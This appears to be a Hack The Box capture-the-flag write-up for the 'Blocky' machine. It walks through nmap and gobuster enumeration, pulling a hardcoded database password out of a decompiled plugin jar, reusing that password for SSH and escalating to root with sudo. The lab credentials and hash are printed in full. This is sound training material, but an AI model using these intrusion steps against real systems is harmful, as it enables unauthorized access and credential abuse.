# BLOCKY

## ENUMERATION

Nmap scan result 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/blocky]
└─$ nmap 10.10.10.37
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 08:55 EDT
Nmap scan report for 10.10.10.37
Host is up (0.24s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
8192/tcp closed sophos

Nmap done: 1 IP address (1 host up) scanned in 18.71 seconds

┌──(kali㉿kali)-[~/Downloads/hackthebox/blocky]
└─$ nmap 10.10.10.37 -p 21,22,80,8192 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 08:56 EDT
Nmap scan report for 10.10.10.37
Host is up (0.22s latency).

PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds
```

Gobuster scan result 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/blocky]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.37 -t 100 -q
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.10.37/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.10.37/javascript/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.10.37/phpmyadmin/]
/plugins              (Status: 301) [Size: 312] [--> http://10.10.10.37/plugins/]   
/server-status        (Status: 403) [Size: 299]                                     
/wiki                 (Status: 301) [Size: 309] [--> http://10.10.10.37/wiki/]      
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.37/wp-includes/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.37/wp-content/] 
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.10.37/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]   
```

Visiting the ```/phpmyadmin``` directory we find a login page 

Next I open the ```/plugins``` directory to find two jar files 

## LOGIN

After downloading the jar file I decompile the files using the command ```jar xf filename``` 
Searching through the files we got after decompilation I found this

```
┌──(kali㉿kali)-[~/…/hackthebox/blocky/com/myfirstplugin]
└─$ cat BlockyCore.class

����4-com/myfirstplugin/BlockyCorejava/lang/ObjectsqlHostLjava/lang/String;sqlUsersqlPass<init>()VCode


        localhost
                       root
                               8YsqfCTnvxAUeduzjNSXe22
                                                       LineNumberTableLocalVariableTableonServerStartrstplugin/BlockyCore;
             onServerStop
                         onPlayerJoi"TODO get usernam$!Welcome to the BlockyCraft!!!!!!!
&
 '(
```

It looks like the username and password so I tried to login with ```username:root and password:8YsqfCTnvxAUeduzjNSXe22``` and it worked

## SSH

I tried ssh using the same creds as above but it didn't work

While checking through all the files with the keyword user in their name I found another user 

![](https://github.com/Leo-2807/Writeups/blob/main/images/blocky.png)

So I tried ssh with ```username:notch and password:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/``` but it didn't work aswell

Then I tried ```username:notch and password:8YsqfCTnvxAUeduzjNSXe22``` and it worked

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/blocky]
└─$ ssh notch@10.10.10.37                                                         255 ⨯
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
```

## USER --> ROOT

Using the command ```sudo -l``` to check sudo previleges of our user

```
notch@Blocky:~$ sudo -l
[sudo] password for notch: 

Sorry, try again.
[sudo] password for notch: 
Sorry, try again.
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo /bin/bash
root@Blocky:~# whoami
root
root@Blocky:~# cd /root
root@Blocky:/root# ls
root.txt
root@Blocky:/root# cat root.txt
```
